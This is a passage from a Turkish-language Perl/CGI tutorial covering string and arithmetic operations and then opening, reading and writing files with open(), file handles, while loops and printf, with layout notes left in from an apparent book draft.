Bu program ekrana “a dostunu sö” yazdıracaktır. substr() fonksiyonunun birinci argümanı içinde arama yapacağımız değişkenin adı, ikinci argümanı aramaya başlanacak karakter poziyonu (Dikkat! Perl saymaya 0’dan başlayacaktır!), ve son argüman bu pozisyon dahil, kaç karakterin belirleneceğini gösteren sayıdır. Buradaki örnekte, Perl’e $Metin1 değişkeninde 3’nci karakterden (‘Bana’ kelimesinin son a harfi) itibaren 12 karakterin neler olduğunu sormuş oluyoruz.

Metin düzenleme konusunda sık sık başvuracağımız split(), chop(), chomp(), shift(), unshift(), pop() ve push() fonksiyonlarını daha önce ele almıştık.

**Biraz da Matematik**

“Ben zaten matematikten kurtulmak için programcı olmuştum!” diyorsanız, belki de hayatta size uygun tek programlama dili Perl sayılır. Bundan, “Perl de matematikten hoşlanmaz!” sonucunu çıkartmayın; tersine matematikle ilgili bütün işleri Perl halleder; size sadece sayıları vermek kalır. Başka programlama dillerinde, bir değişkene atayacağınız sayının türünü, tam sayı mı, kesirli sayı mı olduğunu belirtmeniz gerekir. Perl için, sayı, sayıdır.

Perl, dört işlemi başarıyla yapar. Bunun için sayıların veya sayı tutan değişkenlerin arasında, toplama, çıkartma, çarpma ve bölme için sırasıyla +, -, \* ve / işaretlerini kullanırız.

Diğer bütün diller gibi, Perl’de de matematik işlemler soldan sağa doğru sıra ile yapılır. Yani, “10 + 3 \* 2 / 4” komutu, Perl için şu anlamı taşır:

10 ile 3’ü topla, elde ettiğin sayıyı iki ile çarp; elde ettiğin sayı dörde böl.

Fakat sizin istediğiniz daima bu sıraya uygun olmayabilir. Eğer önce 10 ile 3 toplansın, sonra 2, 4’e bölünsün ve elde edilen iki sonuç birbiri ile çarpılsın istiyorsanız, sonuç çok farklı olacaktır. Perl, matematik işlemlerini istediğiniz sırayla yapsın istiyorsanız, işlemleri parantez içine almalısınız. Örneğin, verdiğimiz örnek şöyle yazılabilir:

(10 + 3) \* (2 / 4)

Perl ile bir sayının başka bir sayı ile üssünü almak için \*\* işaretini kullanırız: 5’in 5’nci kuvvetini bulmak için “5\*\*5” yazmanız yeterli.

Perl bir bölme işleminin kalanını (modulo) bulabilir. 10’un 3’e bölünmesinde kalan sayıyı bulabilmek için “10 % 3” yazar ve bunu bir değişkene atarsanız, değişkenin değeri 1 olur.

Perl, bir sayının önünde eksi işaretini görünce o sayısı negatif yapar; negatif bir sayının önünde eksi işareti görünce de pozitif yapar.

Perl’e bir değişkenin tutuğu sayı ile işlem yaptırtabilir ve sonucu yeni değer olarak aynı değişkende tutmasını bildirebilirsiniz:

$sayi1 = $sayi1 \* 2; veya $sayi1 \*= 2;

$sayi1 = $sayi1 + 2; veya $sayi1 += 2;

$sayi1 = $sayi1 – 2; veya $sayi1 -= 2;

$sayi1 = $sayi1 / 2; veya $sayi1 /= 2;

Perl’de bir değişkenin tuttuğu değeri 1 arttırma veya 1 eksiltme içzin özel bir deyim vardır;

$sayı1 ++;

değişkenin değerini 1 arttırır;

$sayı1 --;

değişkenin değerini 1 eksiltir.

(Ve şimdi Perl’den sonra öğrenmeye karar verdiğiniz C++ ile C dilleri arasındaki farkı ve uzun uzun süre bilgisayarla aynı odada kalmanın kişinin mizah gücüne etkisini öğrenmiş bulunuyorsunuz!)

/////////////////////KUTU////////////////////

**++’nin garip oyunu**

Diyelim ki elinizde değeri 10 olan $Sayı1 değişkeni var. Perl’e “$Sayı1’i 1 arttır ve bulacağın değeri $Sayı2’ye ata!” demek istiyorsunuz. Bu deyimi:

$Sayı2 = $Sayı1++

şeklinde yazarsanız, $Sayı1, 11 olur; ama $Sayı2’ye 10 değeri verilir.

Bunu önlemek için bu deyimi şöyle yazmanız gerekir:B

$Sayı2 = ++$Sayı1

////////////////////////KUTU BİTTİ////////////////////

Perl’ün sayılarda kullanabileceğiniz bazı diğer fonksiyonları vardır:

Karekök: sqrt()

Logaritma: log()

Mutlak sayı: abs()

Bölme işleminin tam sayısı: int()

Bunları birarada sınayabileceğiniz bir örnek program şu olabilir:

$sayi1 = 210;

print "$sayi1\\'in karekökü : ". sqrt($sayi1);

print "<p>\\n";

print "$sayi1\\'in logaritması : ". log($sayi1);

print "<p>\\n";

print "e’nin $sayi1 ‘e eksponensiyeli: ". exp($sayi1);

print "<p>\\n";

$sayi2 = -$sayi1;

print "\\$sayi2 = $sayi2";

print "<p>\\n";

print "$sayi2\\'in mutlak değeri : ". abs($sayi2);

print "<p>\\n";

$sayi3 = $sayi1 + 0.4567;

print "\\$sayi3 = $sayi3";

print "$sayi3\\'in integer’ı : ". int($sayi3);

Perl matematik sever dedik, değil mi? Fakat Perl, sayı ile metnin toplanmayacağını bilmez! Bu ikisini toplar; fakat elde ettiği sonucu artık sayı saymaz:

$Sayi1 = 12345;

$Metin1 = “Zor dostum, zor!”;

$Sayi1 = $Sayi1 . $Metin1;

print $Sayi1;

Biraz önce toplanabilir, çıkartılabilir bir sayı olan $Sayi1, artık bir String’den ibaret ve değeri “12345Zor dostum, zor!” olmuş bulunuyor.

Peki; böylece metinlerle uğraşmanın yollarından bir kısmını öğrendik. Fakat elimizde metin yok. Çünkü henüz Perl’e “Git bu benim C: adlı sabit diskte, Belgelerim dizinindeki filanca isimli dosyayı, al gel bakalım; gelirken bir de sade kahve söyle!” demeyi bilmiyoruz. Şimdi bunun nasıl yapılacağını öğrenelim, ki Internet’teki Form’umuzdan alacağımız bilgileri, örneğin ziyaretçi defterimize yazılan yazıları, diske kaydettirebilelim. Dosya açmayı ve Perl’e okumayı-yazmayı öğrettiğimizde kullanacağımız bir iki fonksiyon daha var ki, onları daha sonra göreceğiz. Burada sadece bu fonksiyonların bir metinrde arama, bulma ve değiştirme işlevleri olduğunu belirtmekle yetinelim.

**Perl’de Dosya İşlemleri**

İlk öğrendiğiniz dosya işlemi, eğer DOS döneminden beri PC ile uğraşıyorsanız, “dir” komutu idi. Akıp giden bir takım listelerle, sabit diskin içindeki “şeyleri” görebilirdik bu komutla. Sonra Windows, önce File Manager (Dosya Yönetici) ile, sonra Windows Explorer (Windows Gezgini) ile sabit disk ve disketlerimizin içindekileri, çeşitli simgelerle ekrandaki bir takım pencerelerde görüntüler oldu. Unix dünyasında, örneğin Linux’ta DOS’un “dir” komutunun yaptığı işlevi “ls” komutu ile yapatırabiliriz; fakat artık Unix bilgisayarları da XWindow ile görsel kullanıcı arabirime sahip oldu; orada da dosyal işlemlerini Mouse işaretçisiyle tıklayarak yapabiliriz. MacOS ise, tasarlandığı birinci günden değilse bile ikinci günden beri dosya işlemleri için grafik arabirimi kullanıyor.

Dolayısıyla, kişisel bilgisayarda dosya işlemleri dediğimiz zaman, aklımıza çoğunlukla “tıklamak,” “sürüklemek” ve “bırakmak” geliyor. Bizim için adeta düşünmeden yapılabilen bu işleri Perl’e yaptırabilmek için, disk kayıt sistemini biraz yakından tanımamız gerekir.

“Dosya,” sabit veya takılıp-çıkartılabilen bir disk (veya CD-ROM) üzerinde, kayıt yapılabilir bir ortama, başladığı ve bittiği yer belirtilerek, belirli bir sisteme göre ve byte birimiyle yapılmış kayıt demektir. Her bir kaydın başladığı ve bittiği yer ve bu ikisinin arasındaki kaydın ne adla anılacağı yazılır. Böylece “Askerlik Mektubu.doc” adlı kaydın, arandığı zaman nerede bulunacağı bilinir.

//////////////////KUTU///////////////////////

**Biraz Unix Bilgisi**

Unix işletim sisteminde sadece disk/disket/CD-ROM’da kayıtlı byte’lara dosya denmez; klavyeden gelmekte olan, okunmakta olan bir sabit diskten alınan, veya bilgisayara iletişim kapılarından (Com Port’lar veya ağ kartları) girmekte olan veya ekran ve iletişim kapılarından çıkmakta olan veri de dosya sayılır; bu özel dosyalara “Standart Girdi/Çıktı” (Standart Input/Output) dosyası denir. Bu dosyalar üçe ayrılır:

Standart Girdi (STDIN) dosyası: Tanım itibariyle klavyeden bilgisayara ulaşmakta olan bilgi akımıdır. Klavyeden bir programa yönelik olarak yazdığınız herşey Standart Input sayılır.

Standart Çıktı (STDOUT) dosyası: Bilgisayarın ekranına gönderilen, dosyaya yazılmak yerine ekrana yazılan her türlü bilgi akımıdır.

Standart Hata (STDERR) dosyası: İster ekrana, ister diske gönderilebilecek bilgi akımıdır. Unix işletim sistemlerinin büyük bir bölümü bu bilgileri sabit diskte dosyaya yazarlar.

Unix sistemleri, bu üç dosyayı kullanarak bir programa veri verebilir veya veri alabilirler.

//////////////////////////KUTU BİTTİ/////////////////////

İşletim sistemi ne olursa olsun, dosyaları iki ana bölüme ayırırız: İnsan tarafından okunabilen dosyalar; sadece makina tarafından okunabilen dosyalar. Düzyazı dosyaları, .INI dosyaları, .CONF dosyaları, herhangi bir düzyazı programı ile açılıp, okunabilir. Okuduğunuz şeyden anlam çıkmaması veya anlaşılır harf olarak görüntülenmeyen bir-iki karakter bulunması dosyanın yazı dosyası olma niteliğini değiştirmez. Makina tarafından okunabilir veya binary (ikili) dosyalar ise programlar tarafından okunabilir. Örneğin uzatması EXE olan bir dosyayı işletim sistemini oluşturan programlar okur. Boyutu küçük bir EXE dosyasını sürükleyerek Not Defteri’nin içine bırakırsanız, bu tür dosyaların nasıl bir içeriğe sahip olduğunu görebilirsiniz. (Dikkatli olun, çok büyük dosyalar Not Defteri’nin çökmesine yol açar; açtığınız dosyayı sakın kaydetmeye kalkmayın!)

Perl’e, düz yazı dosyalarını okutabilirsiniz.

**Dosyayı Açalım!**

Perl açısından bir dosyanın okunması, yazılması veya dosyaya ek yapılması için önce açılması gerekir. Bu, işletim sistemlerinin programlara, dillere ve kullanıcılara getirdiği bir zorunluktur. Perl, hangi işletim sisteminde çalışıyorsa, o sistemin dosya açma yöntemini bilir ve uygular. Bize düşen sadece Perl’e dosyayı açmasını bildirmektir.

Perl’ün ister okumak, ister yazmak, ister eklemek amacıyla olsun, bir dosyayı açmasını open() fonksiyonuyla sağlarız. Bu fonksiyon iki argüman alır:

1. Dosyanın Perl tarafından kullanılırken alacağı ad: Handle. Kelime anlamı kulp, tutacak yer, tutamak, sap anlamına gelen bu ada, başka kaynaklarda belirteç dendiğini görebilirsiniz. Dosya adı ne olursa olsun, Perl, bu dosyadan alacağı bilgi akımını vereceğiniz bu kelime ile tanıyacaktır. (Daha teknik ifade edersek, Unix sisteminde açılan bir dosya, dosya sisteminde özel bir nitelik kazanır. Ona bu niteliğini veren, içindeki verinin sisteme alınacağı yolun oluşturulması; dosyanın sabit diskte başkası tarafından silinmesi veya değiştirilmesine karşı önlem alınması gibi sistem-varî hazırlıkların yapılmasıdır.)

2. Dosyanın adı: Sabit disk sisteminde dosyanın arama yolu (path) ile birlikte adı.

IRC Server’lara ve Chat ortamına aşina olanlar için Handle veya Perl açısından dosyanın içeriğini belirleyen adı, Nick’e benzetebiliriz. Hepimizin bir adı soyadı olduğu halde Chat ortamında herkesin bir Nick’i bulunur. Adımız ne olursa olsun IRC’ye bağlandığımız andan itibaren, bu Nick ile biliniriz.

Dosya, çalışmakta olan Perl ile aynı dizinde ise, dosya adının önüne arama yolu koymaya gerek yoktur. Ancak dosya başka dizinde ise Perl’ün dosyayı nerede arayacağını bilmesi gerekir. Diyelim ki, Perl programının bulunduğu dizinde, “ornek.txt” adlı bir düzyazı dosyamız var; bu dosyayı Perl’e açtırmak istiyoruz:

open (DOSYA, ‘ornek.txt’);

Burada open() fonksiyonuna, “ornek.txt” dosyasını açmasını ve bundan böyle bu dosya ile ilgili işlemlere “dosya” adıyla gönderme yapacağımızı söylüyoruz. Bu dosya, Perl ile aynı dizinde değil de, uzaklarda bir yerde olabilirdi:

open (DOSYA, “../../metinler/duzyazilar/ornek.txt”);

//////////////KUTU/////////////////////

**Path!**

Sabit diskinizdeki arama yolu (Path) ile ilgili yazım kuralları, Web sitesine gelince biraz değişir.

Kişisel Web Server’da Web sitenizin mutlak “root” (kök dizini) adresini bilmeniz kolay. Bu, örneğin c:\\inetpub\\wwwroot gibi bir dizin olmalı. Fakat bir evsahibi firmadan (Host) edindiğiniz Web Sitesinin mutlak arama yolunu bilemezsiniz. Benzeri zorluklar ve güvenlik önlemleri yüzünden Web Server, CGI programları için dosya arama yolunu mutlak değil göreli olarak kullanılması zorunluğunu getirir. Bu, herşeyden önce bütün dosyaların Web sitesinin bulunduğu sabit diskin kök dizinine olmasını göre belirtilmesini gerektirir. Örnek olarak herhangi bir www.örnek\_site.com.tr’nin iskeletinde, sözgelimi çalışmakta olan “oku\_yaz.pl” isimli CGI programı ile bu programın açmak istediği “ornek.txt” dosyasının birbirine göre yerinin şöyle olduğunu düşünelim:

<cgi-perl.013.tif>

Buna göre, open() fonksiyonunda dosyanın arama yolunu iki türlü belirtebiliriz:

1. Mutlak: “/Belgelerim/duzyazılar/ornek.txt

2. Göreli: “../duzyazılar/ornek.txt

ornek.txt, Web alanı dışında olduğu için, hiç kimse bu dosyanın URL (Internet adresini) Browser’ının adres hanesine yazarak, bulamaz; çünkü bu dosyanın Webb alanında olmadığı için URL’i olamaz.

///////////////////////////KUTU BİTTİ///////////////

Dosya adlarının programlama yoluyla (programmatically) verilebileceğini doe belertelim. Diyelim ki, dosya adını tutan bir değişkeniniz var. Bu değişkenin bu değeri nasıl edindiği şimdilik önemli değil. Sözgelimi bu adı Web sitemizi ziyaret eden kişinin bir tercihi belirleyebilir; veya biz değişkene bu değeri atayabiliriz:

$dosya\_adi = ‘ornek.txt’;

open (GIRDI, $dosya\_adi);

Şimdi artık Perl bu dosya ile istediğiniz her türlü okuma, yazma ve ekleme işlemini yapabilir. Bununla birlikte Perl ile dosyalarda yapabileceğimiz işlemleri bilirsek, dosya açma işleminin boyutunu daha iyi anlayabiliriz:

////////////////////KUTU//////////////////////

**Tutamak adı neden büyük harf!**

Perl geleneğinde file handle, açtığınız dosyaların Perl tarafından tanındığı adlar, değişken adı kurallarına uymak zorundadır: rakamla başlayamaz; harfle veya alt-çizgi ile başlar; içinde rakam bulunabilir; işaret bulunamaz. Fakat hemen hemen bütün profesyonel Perl programlarında HANDLE’ın daima büyük harfle yazıldığını göreceksiniz; bu kesinlikle zorunlu değildir.

Tutamak adları, tamamen keyfî olmakla birlikte anlamlı olmalı; programınızı kullanacak veya kendi programına katabilecek kişilerin program akışını anlamalarına imkan vermelidir.

////////////////////////////////////////////////////

Dosya Okuma: Okumak, bir dosyanın içeriğini değiştirmeden içindeki verileri almak ve kullanmak demektir. Bir dosyanın okunmak için açılması için, varolması gerekir. olmayan bir dosya okunmak için açılamaz.

Dosya Yazma: Bir dosyaya yeni bilgi girmek için açmak, yazmak amacıyla açmaktır. Olmayan bir dosyayı, yazmak amacıyla açmak, dosyayı oluşturmak demektir. Varolan bir dosyayı açar ve yazarsanız, dosya silinir ve yeniden yazılır.

Dosyaya Ekleme: Ek yapmak amacıyla açılan dosyanın sonuna yeni veri kaydedilir. Ekleme, mevcut dosyayı silmez; varolan dosyanın içeriğini değiştirir. Olmayan bir dosyayı ek yapmak için açmak, gerçekte yazmak için açmakla aynıdır.

Bir dosya, bu üç işlemden sadece birisi için açılabilir; yani bir dosyayı, hem okumak, hem de yazmak için açamazsınız. Perl’e bir dosyayı ne amaçla açtığınızı söylemeniz gerekir. Bunu, dosya adının önüne koyduğumuz büyüktür-küçüktür işareti ile yaparız: “<” oku; “>” yaz; “>>” ekle! Örnekler:

open (OKU, ‘mevcut.txt’); #Okumak için

open (OKU, ‘<mevcut.txt’); #Okumak için

open (YAZ, ‘>yeni.txt’); #Yazmak için

open (EKLE, ‘>>mevcut.txt’); #Ek yapmak için

Burada okumak amacıyla dosya açarken, dosya adının önüne işaret koymayabileceğimizi görüyorsunuz. Bu imkana rağmen, iyi bir Perl programlama geleneği okumak için bile açsanız, her dosyanın adının önüne amacınızı belirten işareti koymaktır. Dosya tutamakları da dosyanın okunmak amacıyla mı, yoksa yazılmak amacıyla mı açıldığını belirtebilir.

Daha sonra open() fonksiyonuyla birlikte kullanmak üzere bir değişkene değer olarak dosya adı verirken de dosyanın açma amaçı işaretini koyabiliriz:

$dosya\_adi = ‘>ornek.txt’; #Yazmaya hazırlık

open (CIKTI, $dosya\_adi); #Bu dosyaya yazılabilir

/////////////////KUTU///////////////////

**Dosya Açamayan Perl Ölsün Mü?**

open() fonksiyonu, başarıyla sonuçlandıysa, programa True (doğru) sonucunu verir; başarısızlıkla sonuçlanırsa False (Yanlış) sonucunu. open() fonksiyonunun başarısızlıkla sonuçlanması, okumak üzere açmak istediğiniz bir dosyanın verdiğiniz yolda bulunamaması, yazmak veya eklemek üzere açtığınız bir dosyanın salt-okunur olması gibi sebeplerden kaynaklanabilir.

open() fonksiyoru hata verirse, bu kullanarak programı durdurabiliriz. Bunun klasik örneği şudur:

$dosya\_adi = ‘>ornek.txt’; #Yazmaya hazırlık

open (DOSYA, $dosya\_adi) or die “Yazmak için $dosya\_adi açılamıyor. Program zorunlu olarak sona erdi.\\n”;

Buradaki “or die” fonksiyonu “ya dosyayı aç, veya öl!” anlamına geliyor; ve Perl’e dosyayı açamazsa, bir mesaj vererek durmasını bildiriyor.

Bu yöntem bir rapor yazma dili olarak Unix sisteminde kullanıldığı zaman Perl’ün hatalı bir durum oluştuğu halde çalışmaya devam etmesini önlemesi bakımından iyi bir yöntemdir. Fakat Perl’ü, CGI programı olarak çalıştırdığımız zaman Server’daki Perl’ün durması, ziyaretçilerimiz açısından hiç bir anlam taşımaz. Tersine Perl’ün durması değil; hatayı anlayarak ziyaretçiye uygun bir karşılık vermek ve yeni seçenekler sunmak üzere çalışmaya devam etmesi gerekir.

Dolayısıyla, ilkelerini sonra görmek şartıyla, bu deyimi şöyle yazabiliriz:

$dosya\_adi = ‘>ornek.txt’; #Yazmaya hazırlık

open (DOSYA, $dosya\_adi) || &Hata;

Burada, open() fonksiyonunun hata vermesi halini düzenleyen (or/veya) işlemcisi olan “||” işareti ile bir Subrutin (programcınının yazdığı fonksiyon) kullandığımıza dikkat edin. Subrutin meselesine geleceğiz; fakat şimdilik “Hata” adlı ve Perl programının sonuna koyacağımız Subrutin’nin kodunu vermekle yetinelim:

sub Hata {

print “Bir hata oldu; dosya açılmıyor. Ya bu dosya yok, ya da biz Perl’ü yazarken bir hata yaptık!\\n”;

print “Çok özür dileriz.. Şurayı tıklayın da bari başka bir tarafa gidin!\\n”;

print “<A HREF=\\”baska\_bir\_taraf.htm\\”>Tıklayın!</A>\\n”;

exit

}

///////////////////KUTU////////////////////////

**Her sistemin kendi diline göre**

Perl ile yazacağınız CGI programları, çalıştıkları işletim sistemi ortamına göre dosya araya yolu vermek zorundadır. Unix veya NT tabanlı Web Server’lar için, arama yolu URL tarzında olmalıdır. Ancak Perl programınıza kendi sabit diskinizde dosya açtırma denemesi yaptırıyorsanız, bu işletim sistemi göre değişir:

95/98/NT/2000:

open (DOSYA, “>C:\\Belgelerim\\Veriler\\Metinler\\ornek.txt”);

MacOS:

open (DOSYA, “>Ana:Belgeler:Veriler:Metinler:ornek metin”);

Linux:

open (DOSYA, “>/usr/home/belgeler/Veriler/metinler/ornek.txt”);

Bu sistemlerde mutlak arama yolu yerine göreli (çalışmakta olan Perl dosyasına göre) yol da belirtebilirsiniz:

95/98/NT/2000:

open (DOSYA, “>..\\ornek.txt”);

MacOS:

open (DOSYA, “>::ornek metin”);

Linux:

open (DOSYA, “>../ornek.txt”);

///////////////////KUTU BİTTİ//////////////

/////////////////KUTU////////////////////

**Açtığınızı Kapatın!**

Açtığınız dosyayı kapatmanız gerekir. Bunun için programda yapılacak bütün dosya işlemlerinin bittiği yere şu fonksiyonu yazmanız yeter:

close(TUTAMAK);

Burada TUTAMAK kelimesinin yerine dosyayı açarken verdiğiniz tutamak adını yazacaksınız. Dosyayı kapatmazsanız ne olur? Hiç bir şey olmaz; Perl, program bitince dosyayı kapatır. Fakat bir dosyayı ne kadar çabuk kapatırsanız, o kadar iyi: çünkü Perl dosya için close() fonksiyonunu icra etmedikçe, veya kendisi dosyayı zorunlu olarak kapatmadıkça, bellekteki bilgileri dosyaya yazmaz. Bu sırada Server çökebilir; dosya son bilgilerle güncelleştirilmemiş olur. Bu sırada başka bir program dosyayı açmak isteyebilir; dosya eksik olarak sunulur. İyi programcılık tekniği, işi biten dosyanın hemen kapatılmasını gerektirir.

////////////////////KUTU BİTTİ////////////////////////////

**Dosyayı Okuyalım**

Çok güzel! Perl’ü öldürmeden dosyayı açmayı başardık! Şimdi sıra Perl’e dosyadaki yazıyı satır satır okutmakta. Fakat bu çok kolay. open() fonksiyonunda belirttiğiniz dosyanın tutamağını (belirteç’ini, Handle’ını, Nick’ini!) büyüktür-küçüktür işaretleri arasında ve herhangi komutun veya fonksiyonun parçası veya argümanı olarak belirttiğiniz anda, Perl, iki eli kanda olsa, gider ve dosyadan bir satır okur; gelir!

Bu cümle biraz karışık oldu. en iyi örnekle anlatalım. Yukarıda ornek.txt dosyasını, Perl’e “DOSYA” tutamağıyla açmasını bildirdik. Şimdi Perl’e bu dosyadan bir satır okutalım. Bunun için önce kendinize bir ornek.txt dosyası yapmanız ve bunu Perl dosyasının çalıştığı dizine koymanız; farklı dizine koyacaksanız open() fonksiyonunu yazarken, yukarıda öğrendiğimiz şekilde, doğru arama yolu belirtmeniz gerekir. Benim ornek.txt dosyamın birinci satırında şunlar yazılı:

Bu bir örnek düz yazı dosyasıdır. Bu dosyanın içinde bir çok bilgiler yer alıyor.

Sonra açın Not Defteri’ni (veya herhangi bir düzyazı programını) vey şu kodu yazarak dosya01.pl adıyla kaydedin:

**print "HTTP/1.0 200 OK\\n";**

**print "Content-Type: text/html\\n\\n";**

**print "<HTML>\\n";**

**print "<HEAD>\\n";**

**print "<TITLE>Tekrarlama</TITLE>\\n";**

**print "<meta http-equiv=\\"content-type\\" content=\\"text/html; charset=ISO-8859-9\\">\\n";**

**print "<meta http-equiv=\\"Content-Type\\" content=\\"text/html; charset=windows-1254\\">\\n";**

**print "</HEAD>\\n";**

**print "<BODY>\\n";**

**print "<H4>Dosya Aç</H4>\\n";**

**print "<p>\\n";**

**open (DOSYA, "<ornek.txt") || &Hata;**

**$satir1 = <DOSYA>;**

**print $satir1;**

**sub Hata {**

**print "Bir hata oldu; dosya açılmıyor. Ya bu dosya yok, ya da biz Perl’ü yazarken bir hata yaptık!\\n";**

**print "Çok özür dileriz.. Şurayı tıklayın da bari başka bir tarafa gidin!\\n";**

**print "<A HREF=\\"baska\_bir\_taraf.htm\\">Tıklayın!</A>\\n";**

**exit**

**}**

**print "</BODY>\\n";**

**print "</HEAD>\\n";**

**print "</HTML>\\n";**

Bu kodda, okumak amacıyla ve DOSYA tutamağı ile ornek.txt dosyasını açıyoruz; ve ve ilk satırını okutup; okunan metni $satir1 değişkeninin değeri yapıyoruz. Bunu hangi komut yapıyor? Büyüktür-küçüktür işareti içine alınmış olan DOSYA tutamağı yapıyor: <DOSYA>. Burada büyüktür-küçüktür işaretlerine “Dosya Girdi Operatörü” (File Input Operator) denir. Bunu izleyen satırda print() fonksiyonu, bu değişkeni ekrana gönderiyor. Bu alıştırmayı yaptı iseniz, ve dosyanın adını veya yolunu yanlış yazdı iseniz, şu anda ekranda hata mesajını görüyorsunuz! Herşey yolunda gitti ise örnek yazı dosyanızın birinci satırını görüyor olmalısınız.

<cgi-perl014.tif>

Belki ekranda belli olmuyor, ama görüntülenen sadece birinci satırdaki harfler, rakamlar ve işaretler değil, fakat aynı zamanda satırın sonundaki “yeni satır” (newline) karakteri de ekranınızda! Yani gerçekte ekranda görüntülenen metin şu şekilde:

Bu bir örnek düz yazı dosyasıdır. Bu dosyanın içinde bir çok bilgiler yer alıyor.\\n

Perl’ün bir dosyadan “bir satır” yazı okuyabilmesi için yeni satır karakterini bulması gerekir. Bu Perl’ün “satır” saydığı veriyi tanımlamasını sağlar. Hatırlarsanız, bu karakteri chomp() fonksiyonu ile atabiliyoruz!

Yine hatırlarsanız, “$\_” şeklinde yazılan özel bir değişkenden söz etmiş, bu değişkenin Perl’e gelen her verinin ilk uğrak yeri olduğunu söylemiştik. Birazdan, bu değişkeni kullanacağız. Şimdilik, $satir1’in değerinin $\_’in değerine eşit olduğunu belirtmekle yetinelim.

Bu arada, Perl’e bir koşul gerçekleşinceye kadar, biteviye iş yaptırtma, yani döngü kurma fonksiyonlarımızdan while()’ı da hatırlıyor musunuz? Bu fonksiyon, şöyle kullanılıyordu:

while (koşul) {

....koşul;

...doğru;

...iken;

...yapılacak;

...işler;

}

koşul doğru değilse yapılacak işler;

Şimdi bunu dosya okutmakta kullanalım; ve yukarıdaki kodu biraz değiştirelim. dosya01.pl’de :

**$satir1 = <DOSYA>;**

**print $satir1;**

satırlarının yerine şu bloku yazın:

**while (<DOSYA>) {**

**print $\_;**

**}**

Perl programını dosya02.pl adıyla kaydedin; ve çalıştırın. Şimdi ekranda örnek yazı dosyasının içeriğini tümüyle görüyor olmalısınız. Bunu sağlayan bu satırlık bölümü irdeleyelim: while() fonksiyonu verdiğiniz koşul doğru olmaya devam ettiği sürece, süsyül parantezle belirlenen kendi bloku içindeki komut ve fonksiyonları icra eder. Dosya Girdi Operatörü (yani <> işaretleri) arasına aldığınız dosya tutamağının doğru olmaya devam etmesi demek, Perl’ün dosyada okunacak yazı kalmadığına karar vermesi demektir. Dosyada okunacak yazı kaldığı sürece, Dosya Girdi Operatörü dosyayı satır satır okuyacak ve her satırı $\_ değişkeninin içine yazacaktır. Perl programımız ikinci adımda bu değişkeni ekranda görüntüleyecek ve yeniden while() döngüsünün başına dönecektir. Ve bu işlem, dosyada okunacak yazı kalmayıncaya (veya teknik deyimiyle dosya sonu işaretine \[EOF\] rastgelinceye kadar) bu işlem devam edecektir.

Şimdi, buradaki örnekte Perl’ün okuduğu her satırı ya Perl’ün ya da bizim Tekil/Scalar değişkene koyduğumuza dikkat ediyor musunuz? Yani her yeni satır okunduğunda, bir önceki satır siliniyor! Oysa biz dosya işlemlerini çoğu zaman dosyanın tüm içeriğini alıp kullanmak amacıyla okutuyor olabiliriz. Acaba okunan her satırı bir dizi-değişkenin içine koyamaz mıyız?

Neden olmasın? dosya02.pl’deki while() blokuna ait üç satırı silin ve yerine şu üç satırı yazın:

**@satirlar = <DOSYA>;**

**print @satirlar;**

Bu kez dosyayı dosya03.pl adıyla kaydedin ve Browser’da açın. Yine dosyanın tüm içeriğini görüyor olmalısınız.

Bu kez, okuttuğunuz dosya kaybolmadı; hepsi @satirlar değişkeninin içinde duruyor. Şimdi size bir pop quiz!

1. @satirlar’ın kaç elemanı var?

2. Bu elemanları tek tek nasıl görüntüleyebilirsiniz?

(Bu soruların cevabı, bu kitapçığın materyalini oluşturan zip dosyasında, popquiz.pl dosyasında bulunabilir.)

**Dosyaya Yazdıralım**

Perl’ümüz bayağı gelişiyor; önce dosya açmayı öğrendi; sonra okumayı. Şimdi sıra yazmada! Böylece okur-yazar bir Perl’ümüz olacak.

Aslına bakarsanız, Perl’ye baştan beri print() fonksiyonu ile “yazdırıyoruz!” Bu ana kadar bu fonksiyonun ekranda (veya doğru değimiyle, Browser penceresinde) yazmasını sağladık; şimdi bu işlemi diskteki bir dosyaya yapmasını sağlayacağız. Bu işlemi bir dosya açtırarak, ve print() fonksiyonunu bu dosyanın tutamağına (Handle’ına) yönlendirerek yapabiliriz. Örnek:

open (CIKTI, ‘>yazilan\_dosya.txt)’;

print CIKTI “Bu bir örnek satır\\n”;

Bu program, ekranda hiç bir şey görüntülemez; ancak kendi çalıştığı (bulunduğu) dizinde “yazilan\_dosya.txt” adında bir dosya oluşturarak, içine “Bu bir örnek satır” yazar. Bu programı çalıştırdıktan sonra oluşturulan dosyayı açarsanız, içinde bu satırın sonuna yeni satır kodunun da girilmiş olduğunu görürsünüz. Programı çalıştırdığınız anda, Perl, işletim sistemine, böyle bir dosya bulunup bulunmadığını ve varsa, açıp içindekileri değiştirme yetkisi bulunup bulunmadığını sorar.

İşletim sistemi, böyle bir dosya varsa salt okunur olup olmadığına ve Web’de paylaşım izni bulunup bulunmadığına bakar. Dosya salt okunur değilse ve paylaşılabilir nitelikte ise işletim sistemi Perl’e dosyayı açması ve içeriğini değiştirmesi için izin verir. Değilse, Perl size hata mesajı ile acıklı durumu bildirir. (Bir Web Server’da Web sitenizdeki dosyaların okuma-yazda ve çalıştırma izinlerini nasıl düzenleyebileceğinizi son bölümde göreceğiz.) Yazdırmak istediğiniz dosya yoksa ve sizin kullanıcı olarak böyle bir dosya oluşturma hakkınız varsa, Perl önce dosyayı oluşturur; sonra da içine istediğiniz yazıyı yazar.

Okumak için dosya açma alıştırmasında olduğu gibi, yazdırma amacıyla açacağınız dosyalarla ilgili olarak da programınıza hata yakalama subrutini (fonksiyonu) koymalısınız.

Peki, hazır dosya yazdırmayı öğrenmişken, biraz uzunca bir şeyler yazdıralım. Örneğin:

open (CIKTI, ‘>yazilan\_dosya.txt)’;

for ($i = 998; $i < 1102; $i += 1) {

print CIKTI “$i\\n”;

}

Bu programın oluşturduğu dosyayı açtığınızda muhtemelen şöyle bir dizi göreceksiniz:

998

999

1000

1001

1002

Oysa biz genellikle bu tür listelenen bilgilerin sağa hizalanmasını isteriz. Örneğin:

95

998

999

1000

1001

1002

////////////////////SAYFA TASARIMI İÇİN NOT://///////////////

Yukarıdaki birinci listedeki sayılar sola blok; ikinci listedeki sayılar sağa blok olacak.

/////////////////NOT BİTTİ/////////////////

Perl’e, ekrana veya dosyaya bu tür biçimlendirilmiş (formatted) veri yazdırma işlemini printf() fonksiyonu ile yapabiliriz. Bu fonksiyon, Perl’ün biçimlendirme argümanlarını kullanır.

/////////////////KUTU//////////////////////////////////

**Perl’de String Biçimlendirme**

printf() fonksiyonu ile ekrana veya dosyaya String yazdırırken, uygulanan yazım kuralı şöyledir:

printf(BİÇİM, LİSTE);

Örnek:

printf(“%.2F”, $Degisken);

Biçim argümanının elemanları şöyle sıralanır:

